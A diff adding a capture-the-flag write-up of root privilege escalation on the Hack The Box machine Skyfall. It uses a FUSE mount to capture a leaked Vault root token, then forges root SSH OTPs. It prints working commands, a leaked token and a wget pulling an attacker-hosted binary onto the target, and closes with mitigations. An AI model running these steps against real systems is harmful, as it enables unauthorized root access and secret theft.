@@ -4,6 +4,272 @@
 ## c/o https://0xdf.gitlab.io/2024/08/31/htb-skyfall.html
 ##
 
+
+##
+##
+
+---
+
+# Skyfall (HTB) – Full Walkthrough, (root)
+
+## 1. Enumeration of `vault-unseal`
+
+On the box, there is a binary `/root/vault/vault-unseal` which can be executed with `sudo` by the `askyy` user:
+
+```bash
+askyy@skyfall:~$ sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml -h
+```
+
+Help output:
+
+```
+Usage:
+  vault-unseal [OPTIONS]
+
+Application Options:
+  -v, --verbose        enable verbose output
+  -d, --debug          enable debugging output to file (extra logging)
+  -c, --config=PATH    path to configuration file
+
+Help Options:
+  -h, --help           Show this help message
+```
+
+💡 **Observation:** This looks like a customized version of [vault-unseal by lrstanley](https://github.com/lrstanley/vault-unseal). Normally the upstream tool supports `--log-path`, but here only `--debug` exists, which writes to a `debug.log` file in the **current working directory**.
+
+So if we run:
+
+```bash
+sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml -vd
+```
+
+It indeed writes `debug.log`. But because the working directory defaults to the user’s `$PWD`, the file is created as **root:root** with restrictive permissions:
+
+```bash
+askyy@skyfall:~$ ls -l
+-rw------- 1 root root  590 Aug 27 12:37 debug.log
+```
+
+Result: we can rename/delete this log but *not read it*.
+
+---
+
+## 2. Idea: Redirect Root-Written Logs Into Our Control
+
+Problem: root writes sensitive data into `debug.log`, but we want to read it.  
+Solution: abuse **FUSE** file systems to “trick” root into writing into something we control.
+
+### 2.1 Background – FUSE and `user_allow_other`
+
+- **FUSE (Filesystem in Userspace):** lets unprivileged users mount their own filesystems.  
+- Normally, only the user who mounted the FS can access it.  
+- But if `/etc/fuse.conf` contains:
+
+```
+user_allow_other
+```
+
+Then filesystems can be mounted with `allow_other`, meaning *other users (including root)* can also access the mount.
+
+📌 Security risk: if root writes to a file in a user-owned mount, permissions may grant the non-root user visibility.
+
+---
+
+### 2.2 Why Not Use SSHFS?
+
+One option would be to mount back to our attacker’s host over `sshfs`. But this exposes our machine over SSH — not ideal in HTB labs.  
+Instead, we’ll use a local FUSE project: **go-fuse/memfs**.
+
+---
+
+## 3. Using `memfs` (Go-FUSE Example)
+
+### 3.1 Compile `memfs`
+
+On our attacker machine:
+
+```bash
+cd go-fuse/example/memfs
+go build -buildvcs=false
+```
+
+This produces:
+
+```
+main.go
+memfs   (binary)
+```
+
+### 3.2 How `memfs` Works
+
+Usage:
+
+```bash
+./memfs MOUNTPOINT BACKING-PREFIX
+```
+
+- `MOUNTPOINT`: directory where to mount FS.  
+- `BACKING-PREFIX`: prefix where file writes get mirrored.
+
+Demo:
+
+```bash
+mkdir ~/testfs
+./memfs ~/testfs memfsoutput-
+```
+
+From another terminal:
+
+```bash
+echo "testing..." > ~/testfs/file1
+```
+
+Result: a log file `memfsoutput-1` appears in the *launch directory*, capturing the content.
+
+### 3.3 Modifying to Support `allow_other`
+
+If root writes to FS, without `allow_other` it fails (`Permission denied`).  
+Fix: edit `main.go` to include:
+
+```go
+server, err := fuse.NewServer(conn.RawFS(), mountPoint, &fuse.MountOptions{
+    Debug: *debug,
+    AllowOther: true,
+})
+```
+
+Rebuild:
+
+```bash
+go build -buildvcs=false
+```
+
+Now, root can also write.
+
+---
+
+## 4. Deploy on Skyfall
+
+Upload and run:
+
+```bash
+askyy@skyfall:/dev/shm$ wget http://10.10.14.6/memfs
+chmod +x memfs
+mkdir out
+./memfs out/ out
+```
+
+It hangs on `Mounted!` (normal). Open another shell:
+
+```bash
+cd /dev/shm/out
+sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml -vd
+```
+
+Now check:
+
+```bash
+cat debug.log
+```
+
+🎉 Output:
+
+```
+Master token found in config: hvs.I0ewVsmaKU1SwVZAKR3T0mmG
+```
+
+---
+
+## 5. Vault Token Abuse
+
+Now we have a **master/root Vault token**.
+
+On attacker machine:
+
+```bash
+vault login
+Token (will be hidden): hvs.I0ewVsmaKU1SwVZAKR3T0mmG
+```
+
+Result:
+
+```
+Success! You are authenticated.
+Policies: ["root"]
+```
+
+This token has **root policy** → complete control of Vault.
+
+---
+
+## 6. Exploiting Vault SSH Backend
+
+Vault has an SSH secrets engine enabled:
+
+```bash
+vault list ssh/roles
+```
+
+Shows:
+
+```
+admin_otp_key_role
+dev_otp_key_role
+```
+
+Inspect one:
+
+```bash
+vault read ssh/roles/admin_otp_key_role
+```
+
+```
+allowed_users   root
+key_type        otp
+port            22
+cidr_list       10.0.0.0/8
+```
+
+This means: Vault can generate **OTP-based root SSH logins**.
+
+Generate OTP:
+
+```bash
+vault write ssh/creds/admin_otp_key_role ip=127.0.0.1
+```
+
+Example output:
+
+```
+Key           Value
+---           -----
+otp           7f9a2e1b-abc1-45ce
+```
+
+Now SSH:
+
+```bash
+ssh root@skyfall.htb
+# Enter OTP when prompted as password
+```
+
+Boom — root shell.
+
+---
+
+## Wrap-up / Variations
+
+- **Alternative exploit:** Instead of memfs, you could mount with `sshfs` or `curlftpfs` if root was logging to configurable paths.  
+- **Privilege escalation vector:** Here the privilege escalation is specifically via `vault-unseal` logging unsafe secrets into a world-exposed FUSE mount.  
+- **Mitigation on real systems:**
+  - Remove `user_allow_other` from `/etc/fuse.conf`
+  - Configure logs to safe paths not influenced by user CWD
+  - Avoid storing Vault root tokens in config  
+
+##
+##
+
+
 Running this program with -h shows the help menu:
 
 ```
